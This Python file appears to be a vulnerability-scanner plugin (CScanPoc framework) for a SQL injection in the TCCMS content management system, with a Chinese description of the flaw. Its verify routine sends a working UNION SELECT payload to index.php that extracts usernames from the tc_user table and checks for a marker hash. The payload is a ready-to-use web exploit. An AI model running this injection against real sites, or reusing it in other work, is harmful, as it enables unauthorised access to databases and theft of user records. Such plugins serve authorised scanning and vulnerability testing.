# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'TCCMS_0003_L'  # 平台漏洞编号，留空
    name = 'TCCMS sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-08-14'  # 漏洞公布时间
    desc = '''
        TCCMS是一款具有良好的扩展性、安全、高效的内容管理系统。其核心框架TC，具备大数据量,高并发,易扩展等特点。
        TCCMS 在 /system/core/controller.class.php中
        当Config::get("checkHack") &&　IN_ADMIN != TRUE 时 调用 initLogHacker，过滤sql。
        checkHack默认是为true的 然而 IN_ADMIN 常量是未定义的 在 php中 如果使用了一个未定义的常量，PHP 假定想要的是该常量本身的名字，如同用字符串调用它一样（CONSTANT 对应 "CONSTANT"）。此时将发出一个 E_NOTICE 级的错误（参考 http://php.net/manual/zh/language.constants.syntax.php）
        此时 IN_ADMIN = "IN_ADMIN " 所以 为 true的。
        if (Config::get("checkHack") &&　IN_ADMIN != TRUE) 逻辑不成立 导致 sql过滤函数调用失败。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2064/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TCCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'def2ed91-d330-49a1-814d-c61d7540ae3b'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 注册用户
            s = requests.session()
            s.get(self.target)
            payload = '/index.php?ac=news_all&yz=1%20union%20select%20group_concat%28username,0x23,md5%28c%29%29,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%20from%20tc_user%23'
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
